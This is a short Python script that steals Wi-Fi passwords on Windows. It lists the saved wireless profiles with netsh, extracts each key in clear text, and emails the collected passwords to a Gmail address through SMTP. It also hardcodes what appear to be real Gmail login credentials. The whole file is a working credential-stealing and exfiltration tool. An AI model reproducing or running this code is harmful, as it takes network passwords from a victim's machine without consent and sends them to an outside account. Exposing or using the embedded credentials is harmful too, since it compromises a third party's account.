#!/usr/bin/env python

import subprocess
import smtplib
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


# netsh wlan show profile WI-FI key=clear
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    result += subprocess.check_output(command, shell=True)

send_mail("vlddvdnk@gmail.com", "Adik6751", result)
